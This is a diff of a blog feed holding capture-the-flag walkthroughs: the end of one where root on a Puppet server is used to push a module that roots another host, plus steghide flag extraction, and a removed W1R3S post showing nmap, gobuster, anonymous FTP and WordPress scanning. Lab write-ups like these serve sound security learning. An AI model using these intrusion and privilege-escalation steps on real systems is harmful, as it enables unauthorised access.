+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)</p>
+
+<ul>
+<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
+</ul>
+
+
+<p> System information disabled due to load higher than 1.0</p>
+
+<p>The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.</p>
+
+<p>nleeson@barringsbank:~$
+```</p>
+
+<h2>Rooting barringsbank</h2>
+
+<p>Inside nleeson&rsquo;s home there&rsquo;s nothing interesting. I found another reticulatingsplines picture like in eric&rsquo;s home. There wasn&rsquo;t anything exploitable around, but we know that Puppet is pushing configuration changes from the puppet VM. With my root privileges in that VM, I edited the <strong>nodes.pp</strong> and <strong>site.pp</strong> files in <code>/etc/puppet/manifests</code> to include the wiggle module on barringsbank as well:</p>
+
+<p><code>
+node 'barringsbank.example.com' inherits 'default' {
+  include wiggle
+  }
+</code></p>
+
+<p>If you&rsquo;re wondering how long you have to wait for Puppet changes to propagate over the nodes, there&rsquo;s a cron job that runs every 10 minutes:</p>
+
+<p>```</p>
+
+<h1>Puppet Name: puppet check in</h1>
+
+<p>*/10 * * * * /usr/bin/puppet agent &mdash;test > /dev/null 2>&amp;1
+```</p>
+
+<p>Nothing&rsquo;s stopping us from running the agent though. Whichever way you choose, the spin binary will now appear in /tmp on barringsbank, and that&rsquo;s another root:</p>
+
+<p>Inside /root there&rsquo;s an image owned by nleeson that I transferred all the way back to my machine:</p>
+
+<p><code>
+-rw-rw-r--  1 nleeson nleeson 215K Dec 21  2016 me.jpeg
+</code></p>
+
+<p><img class="center" src="/images/pentest/analoguepond/me.jpeg" title="&lsquo;final flag&rsquo; &lsquo;final flag&rsquo;" ></p>
+
+<h2>Final flag</h2>
+
+<p>Checking for embedded data on the image, we&rsquo;re being asked for a passphrase. I&rsquo;ve used all the hints, tried extrabacon as well..but remember the 2 cow pictures called reticulatingsplines found on 2 separate machines. Trying that as the passphrase worked:</p>
+
+<p>```
+steghide info me.jpeg
+&ldquo;me.jpeg&rdquo;:
+  format: jpeg
+  capacity: 11.9 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file &ldquo;primate_egyptian_flag.txt&rdquo;:</p>
+
+<pre><code>size: 3.7 KB
+encrypted: rijndael-128, cbc
+compressed: yes
+</code></pre>
+
+<p>```</p>
+
+<p>I then extracted the file:</p>
+
+<p><code>
+steghide extract -sf me.jpeg
+Enter passphrase:
+wrote extracted data to "primate_egyptian_flag.txt".
+</code></p>
+
+<p>A big hex string that gets decoded to another reversed Base64 string. I used the CLI to decode the flag:</p>
+
+<p>```
+cat primate_egyptian_flag.txt | xxd -p -r | rev | base64 -d</p>
+
+<p>Here&rsquo;s a fender bass for you&hellip;</p>
+
+<pre><code>                              ,-.        _.---._
+                            |  `\.__.-''       `.
+                             \  _        _  ,.   \
+       ,+++=._________________)_||______|_|_||    |
+      (_.ooo.===================||======|=|=||    |
+         ~~'                 |  ~'      `~' o o  /
+                              \   /~`\     o o  /
+                               `~'    `-.____.-'
+</code></pre>
+
+<p>Congratulations to you once again and for the sixth time on capturing this
+flag!</p>
+
+<p>I&rsquo;ve tried to mix things up a bit here, to move away from throw metasploit
+and web exploits at things. I hope you have enjoyed that portion and your
+feedback on this aspect would be appreciated.</p>
+
+<p>Of note, these VMs are set to do automatic security updates using puppet,
+so this ought to keep things dynamic enough for people.</p>
+
+<p>Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.</p>
+
+<p>A special thank you to g0tmi1k for hosting all these challenges and the
+valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
+me on IRC or twitter if you are looking for a hint or have completed the
+challenge.</p>
+
+<p>Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In
+The North &copy; BBC 1995.. What&rsquo;s the connection&hellip;.?</p>
+
+<pre><code>                                                       --Knightmare
+</code></pre>
+
+<p>```</p>
+
+<p>This was another excellent machine by Knightmare! Using puppet for exploitation was a new and exciting way to pwn the box.</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Communicate! It can&rsquo;t make things any \</p>
+
+<h2>\ worse.                                /</h2>
+
+<pre><code>   \   ^__^
+    \  (oo)\_______
+       (__)\       )\/\
+           ||----w |
+           ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Derpnstink]]></title>
@@ -180,7 +984,7 @@ a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 <p>Now we can SSH on the box:</p>
 
 <p>```
-ssh -i stinky_key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#115;&#116;&#105;&#110;&#x6b;&#121;&#x40;&#x64;&#101;&#114;&#x70;&#x6e;&#x73;&#x74;&#105;&#110;&#x6b;&#x2e;&#108;&#x6f;&#x63;&#x61;&#108;">&#115;&#116;&#x69;&#110;&#x6b;&#121;&#x40;&#100;&#101;&#114;&#112;&#110;&#x73;&#116;&#x69;&#x6e;&#x6b;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;</a>
+ssh -i stinky_key <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#115;&#116;&#x69;&#110;&#x6b;&#121;&#64;&#100;&#101;&#114;&#x70;&#110;&#115;&#116;&#105;&#110;&#107;&#46;&#108;&#111;&#99;&#97;&#x6c;">&#115;&#x74;&#105;&#x6e;&#x6b;&#x79;&#x40;&#100;&#x65;&#x72;&#x70;&#x6e;&#115;&#116;&#x69;&#110;&#107;&#x2e;&#x6c;&#111;&#x63;&#97;&#108;</a>
 Ubuntu 14.04.5 LTS</p>
 
 <pre><code>                   ,~~~~~~~~~~~~~..
@@ -232,7 +1036,7 @@ pass1=derpderpderpderpderpderpderp
 
 <p>```
 mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
-From: Help Desk <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#104;&#x65;&#108;&#x70;&#100;&#x65;&#x73;&#x6b;&#x40;&#100;&#x65;&#114;&#112;&#x6e;&#115;&#116;&#105;&#x6e;&#x6b;&#46;&#108;&#111;&#x63;&#x61;&#x6c;">&#x68;&#x65;&#108;&#x70;&#x64;&#101;&#x73;&#107;&#x40;&#100;&#101;&#114;&#112;&#110;&#115;&#116;&#x69;&#110;&#107;&#46;&#108;&#111;&#99;&#97;&#108;</a>
+From: Help Desk <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x68;&#x65;&#x6c;&#x70;&#x64;&#101;&#x73;&#107;&#64;&#100;&#x65;&#114;&#112;&#110;&#115;&#x74;&#105;&#110;&#x6b;&#46;&#108;&#111;&#99;&#97;&#108;">&#104;&#x65;&#x6c;&#112;&#x64;&#x65;&#115;&#107;&#64;&#x64;&#x65;&#114;&#112;&#x6e;&#x73;&#x74;&#x69;&#x6e;&#x6b;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;</a>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
 To: Derp, Mr (mrderp) [C]
@@ -548,7 +1352,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof
 <p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
 
 <p>```
-ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#111;&#x72;&#119;&#x65;&#x6c;&#x6c;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#x35;&#57;&#46;&#x31;&#51;&#x32;">&#x6f;&#114;&#x77;&#x65;&#108;&#x6c;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#53;&#57;&#x2e;&#x31;&#51;&#x32;</a>
+ssh -i id_ed25519 <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6f;&#x72;&#119;&#101;&#x6c;&#108;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#53;&#57;&#x2e;&#x31;&#51;&#x32;">&#111;&#114;&#119;&#x65;&#108;&#108;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#49;&#53;&#x39;&#46;&#49;&#x33;&#x32;</a>
 Welcome to</p>
 
 <hr />
@@ -566,7 +1370,7 @@ if you run into any issue you can find me on Twitter: @dhn_
 or feel free to write me a mail to:</p>
 
 <ul>
-<li>Email: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#100;&#x68;&#110;&#64;&#122;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#x2e;&#x70;&#119;">&#x64;&#104;&#110;&#x40;&#x7a;&#x65;&#x72;&#x30;&#x2d;&#x64;&#97;&#121;&#x2e;&#112;&#119;</a></li>
+<li>Email: <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#100;&#104;&#110;&#64;&#x7a;&#x65;&#114;&#x30;&#x2d;&#100;&#97;&#x79;&#46;&#112;&#119;">&#100;&#x68;&#110;&#64;&#122;&#101;&#114;&#x30;&#45;&#x64;&#x61;&#121;&#46;&#x70;&#x77;</a></li>
 <li>GPG key: 0x2641123C</li>
 <li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
 </ul>
@@ -675,7 +1479,7 @@ YES!! You did it :&ndash;). Congratulations!</p>
 
 <p>I hope you enjoyed this CTF VM.</p>
 
-<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x64;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#48;&#45;&#100;&#x61;&#x79;&#x2e;&#112;&#119;">&#100;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#x30;&#45;&#x64;&#x61;&#121;&#x2e;&#112;&#119;</a></p>
+<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x64;&#104;&#x6e;&#x40;&#122;&#101;&#x72;&#48;&#45;&#100;&#97;&#x79;&#46;&#112;&#x77;">&#x64;&#104;&#x6e;&#64;&#x7a;&#x65;&#x72;&#x30;&#x2d;&#x64;&#x61;&#x79;&#46;&#x70;&#119;</a></p>
 
 <p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
 ```</p>
@@ -1156,7 +1960,7 @@ LIST
 .
 RETR 1
 +OK 544 octets
-Return-Path: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#100;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;&#46;&#x67;&#111;&#x6c;&#100;&#101;&#110;&#x65;&#121;&#101;</a>
+Return-Path: <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#46;&#103;&#111;&#x6c;&#100;&#x65;&#110;&#101;&#121;&#101;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#46;&#x30;&#x2e;&#49;&#46;&#x67;&#x6f;&#108;&#100;&#101;&#x6e;&#101;&#x79;&#x65;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from ok (localhost [127.0.0.1])</p>
@@ -1167,7 +1971,7 @@ for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
 Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-From: <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#114;&#111;&#111;&#x74;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#x64;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;&#x2e;&#x67;&#111;&#108;&#100;&#101;&#x6e;&#x65;&#x79;&#x65;</a></p>
+From: <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#114;&#x6f;&#x6f;&#116;&#64;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#x31;&#46;&#x67;&#111;&#108;&#x64;&#101;&#x6e;&#x65;&#x79;&#101;">&#x72;&#111;&#111;&#116;&#x40;&#49;&#x32;&#55;&#46;&#48;&#46;&#48;&#x2e;&#x31;&#x2e;&#x67;&#111;&#108;&#x64;&#101;&#x6e;&#x65;&#x79;&#x65;</a></p>
 
 <p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
 .
@@ -1190,7 +1994,7 @@ From: natalya@ubuntu</p>
 .
 RETR 3
 +OK 921 octets
-Return-Path: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x61;&#x6c;&#x65;&#x63;&#x40;&#106;&#x61;&#x6e;&#117;&#115;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#108;&#101;&#x63;&#64;&#x6a;&#x61;&#110;&#117;&#x73;&#46;&#x62;&#x6f;&#x73;&#115;</a>
+Return-Path: <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x61;&#108;&#101;&#x63;&#x40;&#106;&#97;&#x6e;&#117;&#115;&#46;&#x62;&#x6f;&#x73;&#115;">&#x61;&#x6c;&#x65;&#99;&#x40;&#106;&#x61;&#110;&#117;&#115;&#46;&#98;&#111;&#115;&#x73;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from janus (localhost [127.0.0.1])</p>
@@ -1201,7 +2005,7 @@ for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
 Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-From: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x61;&#108;&#x65;&#x63;&#x40;&#x6a;&#x61;&#x6e;&#117;&#x73;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#x6c;&#101;&#x63;&#64;&#x6a;&#97;&#x6e;&#x75;&#x73;&#x2e;&#x62;&#111;&#115;&#x73;</a></p>
+From: <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#97;&#108;&#x65;&#99;&#64;&#106;&#97;&#110;&#117;&#x73;&#x2e;&#x62;&#x6f;&#x73;&#115;">&#97;&#x6c;&#101;&#99;&#64;&#106;&#97;&#110;&#x75;&#115;&#x2e;&#x62;&#111;&#x73;&#115;</a></p>
 
 <p>Boris,</p>
 
@@ -1456,572 +2260,6 @@ Alec told me to place the codes here:</p>
         (__)\       )\/\
             ||----w |
             ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Getting in the W1R3S]]></title>
-    <link href="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/"/>
-    <updated>2018-11-30T16:18:45+02:00</updated>
-    <id>http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s</id>
-    <content type="html"><![CDATA[<p>With today&rsquo;s post I am experimenting with a new way of writing my hacking blog posts based on the <a href="https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited">5 phases of red teams assessments</a>.</p>
-
-<!-- more -->
-
-
-<h2>Phase 1: OPORD</h2>
-
-<p>The machine description is the following:</p>
-
-<p>```
-You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).</p>
-
-<p>Difficulty to get a low privileged shell: Beginner/Intermediate</p>
-
-<p>Difficulty to get privilege escalation: Beginner/Intermediate</p>
-
-<p>About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.
-```</p>
-
-<h2>Phase 2: RECON</h2>
-
-<p><code>
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 2.0.8 or later
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
-| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
-|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to ::ffff:192.168.145.130
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 1
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
-|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
-|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
-80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-3306/tcp open  mysql   MySQL (unauthorized)
-</code></p>
-
-<p>The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:</p>
-
-<p>```
-gobuster -u <a href="http://192.168.145.134">http://192.168.145.134</a> -w /usr/share/wordlists/dirb/common.txt</p>
-
-<p>=====================================================</p>
-
-<h1>Gobuster v2.0.0              OJ Reeves (@TheColonial)</h1>
-
-<p>[+] Mode         : dir
-[+] Url/Domain   : <a href="http://192.168.145.134/">http://192.168.145.134/</a>
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403</p>
-
-<h1>[+] Timeout      : 10s</h1>
-
-<h1>2018/11/30 05:46:49 Starting gobuster</h1>
-
-<p>/.hta (Status: 403)
-/.htaccess (Status: 403)
-/.htpasswd (Status: 403)
-/administrator (Status: 301)
-/index.html (Status: 200)
-/javascript (Status: 301)
-/server-status (Status: 403)</p>
-
-<h1>/wordpress (Status: 301)</h1>
-
-<p>```</p>
-
-<p>Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.</p>
-
-<h2>Phase 3: TARGET ID</h2>
-
-<p>Logging in to the FTP server, we see the following directories:</p>
-
-<p><code>
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
-drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
-drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
-</code></p>
-
-<p>I downloaded them to my machine with <code>wget -r <a href="ftp://ftp:anonymous@192.168.145.134/">ftp://ftp:anonymous@192.168.145.134/</a></code>. Inside the <em>content</em> folder there are 3 text files, and one of them contains potentially interesting data:</p>
-
-<p>```
-root@onosendai:~/target/192.168.145.134/content# ls -alh
-total 20K
-drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
-drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
--rw-r&mdash;r&mdash; 1 root root   29 Jan 23  2018 01.txt
--rw-r&mdash;r&mdash; 1 root root  165 Jan 23  2018 02.txt
--rw-r&mdash;r&mdash; 1 root root  582 Jan 23  2018 03.txt
-root@onosendai:~/target/192.168.145.134/content# cat 01.txt
-New FTP Server For W1R3S.inc
-root@onosendai:~/target/192.168.145.134/content# cat 02.txt
-#
-#
-#
-#
-#
-#
-#
-#
-01ec2d8fc11c493b25029fb1f47f39ce
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</p>
-
-<h6>#</h6>
-
-<p>root@onosendai:~/target/192.168.145.134/content# cat 03.txt
-<em><em><em><em><em><em><em><em><em><strong>.</strong>              <strong>      </strong>  </em></em></em></em></em></em></em></em></em><em><em><strong><strong><strong><strong><strong><em>   </em></strong></strong></strong></strong>    .</strong>             <br/>
-_</em>    </em><strong>/|  |</strong>   <strong><strong>   /  \    /  \/<em>   _</em></strong></strong>   _<strong><strong>  \ /   </strong></strong><em>/    |<strong>| </strong></em><em>   </em><em><strong><br/>
-  |    |   |  |  _/ </strong> \  \   \/\/   / |   ||       </em>/ <em>(<strong>  &lt; _</strong></em><em>  \     |  |/    _/ </em><strong>\
-  |    |   |   Y  \  </strong><em>/   \        /  |   ||    |   \/       \/        \    |  |   |  \  _<strong>
-  |</strong></em><em>|   |</em><strong>|  /_</strong>  >   _<em>/\  /   |</em><strong>||</strong><strong>|<em>  /</em></strong><strong><em>  /</em></strong><em><strong>_  / /\ |</strong>|</em><strong>|  /_</strong>  ></p>
-
-<pre><code>            \/     \/         \/                \/       \/        \/  \/         \/     \/
-</code></pre>
-
-<p>```</p>
-
-<p>I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let&rsquo;s move on.</p>
-
-<p>Inside <em>docs</em> there&rsquo;s a text file with some upside down text:</p>
-
-<p>```
-root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt</p>
-
-<pre><code>ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
-</code></pre>
-
-<p>&hellip;.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
-```</p>
-
-<p>Used an <a href="http://flip-upsidedown-text.1bestlink.net/">online converter</a> to flip this and reverse it for the text:</p>
-
-<p><code>
-we have a ןot of work to do‘ stop pןaying around˙˙˙˙
-i don't think this is the way to root!
-</code></p>
-
-<p>This is also useless..The final piece gives us some names that we might be able to use later:</p>
-
-<p>```
-root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
-The W1R3S.inc employee list</p>
-
-<p>Naomi.W &ndash; Manager
-Hector.A &ndash; IT Dept
-Joseph.G &ndash; Web Design
-Albert.O &ndash; Web Design
-Gina.L &ndash; Inventory
-Rico.D &ndash; Human Resources
-```</p>
-
-<p>This is all the information we got from the FTP vector. Let&rsquo;s return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:</p>
-
-<p><code>
-192.168.145.134 localhost
-</code></p>
-
-<p>Now I could get to the Wordpress blog, which looks to be under construction:</p>
-
-<p><img class="center" src="/images/pentest/w1r3s/wordpress.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress&rsquo;" ></p>
-
-<p>I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with <a href="https://github.com/m4ll0k/WPSeku">WPSeku</a></p>
-
-<blockquote><p>WPSeku &ndash; Wordpress Security Scanner</p>
-
-<p>WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>
-
-<p>```</p>
-
-<h2>python3 wpseku.py</h2>
-
-<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
-| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
-|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>
-
-<pre><code>  |_|             v0.4.0
-</code></pre>
-
-<p>WPSeku &ndash; Wordpress Security Scanner</p>
-
-<h2>by Momo Outaadi (m4ll0k)</h2>
-
-<p>Usage: wpseku.py [options]</p>
-
-<pre><code>-u --url    Target URL (e.g: http://site.com)
--b --brute  Bruteforce login via xmlrpc
--U --user   Set username for bruteforce, default "admin"
--s --scan   Checking wordpress plugin code
--p --proxy  Use a proxy, (host:port)
--c --cookie Set HTTP Cookie header value
--a --agent  Set HTTP User-agent header value
--r --ragent Use random User-agent header value
--R --redirect   Set redirect target URL False
--t --timeout    Seconds to wait before timeout connection
--w --wordlist   Set wordlist, default "db/wordlist.txt"
--v --verbose    Print more informations
--h --help   Show this help and exit
-</code></pre>
-
-<p>Example:</p>
-
-<pre><code> wpseku.py --url http://site.com/
- wpseku.py --url http://site.com --brute --user test
- wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt
-</code></pre>
-
-<p>```</p>
-
-<p>Ran it against the target:</p>
-
-<p>```</p>
-
-<h2>python3 wpseku.py -u <a href="http://localhost/wordpress/">http://localhost/wordpress/</a> -v</h2>
-
-<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
-| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
-|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>
-
-<pre><code>  |_|             v0.4.0
-</code></pre>
-
-<p>WPSeku &ndash; Wordpress Security Scanner</p>
-
-<h2>by Momo Outaadi (m4ll0k)</h2>
-
-<p>[ + ] Target: <a href="http://localhost/wordpress/">http://localhost/wordpress/</a>
-[ + ] Starting: 07:52:06</p>
-
-<p>[ + ] Server: Apache/2.4.18 (Ubuntu)
-[ i ] Checking Full Path Disclosure&hellip;
-[ i ] Checking wp-config backup file&hellip;
-[ + ] wp-config.php available at: <a href="http://localhost/wordpress/wp-config.php">http://localhost/wordpress/wp-config.php</a>
-[ i ] Checking common files&hellip;
-[ + ] readme.html file was found at: <a href="http://localhost/wordpress/readme.html">http://localhost/wordpress/readme.html</a>
-[ i ] Checking directory listing&hellip;
-[ + ] Dir &ldquo;/wp-admin/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/css/">http://localhost/wordpress/wp-admin/css/</a>
-[ + ] Dir &ldquo;/wp-admin/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/images/">http://localhost/wordpress/wp-admin/images/</a>
-[ + ] Dir &ldquo;/wp-admin/includes&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/includes/">http://localhost/wordpress/wp-admin/includes/</a>
-[ + ] Dir &ldquo;/wp-admin/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/js/">http://localhost/wordpress/wp-admin/js/</a>
-[ + ] Dir &ldquo;/wp-content/uploads&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-content/uploads/">http://localhost/wordpress/wp-content/uploads/</a>
-[ + ] Dir &ldquo;/wp-includes/&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/">http://localhost/wordpress/wp-includes/</a>
-[ + ] Dir &ldquo;/wp-includes/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/js/">http://localhost/wordpress/wp-includes/js/</a>
-[ + ] Dir &ldquo;/wp-includes/Text&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/Text/">http://localhost/wordpress/wp-includes/Text/</a>
-[ + ] Dir &ldquo;/wp-includes/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/css/">http://localhost/wordpress/wp-includes/css/</a>
-[ + ] Dir &ldquo;/wp-includes/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/images/">http://localhost/wordpress/wp-includes/images/</a>
-[ + ] Dir &ldquo;/wp-includes/pomo&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/pomo/">http://localhost/wordpress/wp-includes/pomo/</a>
-[ + ] Dir &ldquo;/wp-includes/theme-compat&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/theme-compat/">http://localhost/wordpress/wp-includes/theme-compat/</a>
-[ i ] Checking wp-loging protection&hellip;
-[ i ] Checking robots paths&hellip;
-[ i ] Checking WordPress version&hellip;
-[ + ] Running WordPress version: 4.9.8
-  |   Not found vulnerabilities</p>
-
-<p>[ i ] Passive enumeration themes&hellip;
-[ + ] Name: twentyseventeen
-[ i ] Checking themes changelog&hellip;
-[ i ] Checking themes full path disclosure&hellip;
-[ i ] Checking themes license&hellip;
-[ i ] Checking themes readme&hellip;
-[ i ] Checking themes directory listing&hellip;
-[ i ] Checking theme vulnerabilities&hellip;
-  |   Not found vulnerabilities</p>
-
-<p>[ i ] Passive enumeration plugins&hellip;
-[ + ] Not found plugins with passive enumeration</p>
-
-<h2>[ i ] Enumerating users&hellip;</h2>
-
-<h2>| ID | Username | Login    |</h2>
-
-<p>|  0 | Admin    | admin    |
-|  1 | Admin    | None     |
-|  2 |          | admin    |</p>
-
-<h2>|  3 |          | joseph-g |</h2>
-
-<p>```</p>
-
-<p>Nothing evidently exploitable in the scan results, so I turned to the <em>/administrator</em> folder on the web server and got to the configuration screen of a Cuppa CMS:</p>
-
-<p><img class="center" src="/images/pentest/w1r3s/cuppa-cms.png" title="&lsquo;cuppa cms&rsquo; &lsquo;cuppa cms&rsquo;" ></p>
-
-<p>Couldn&rsquo;t proceed with the configuration because I didn&rsquo;t have enough information:</p>
-
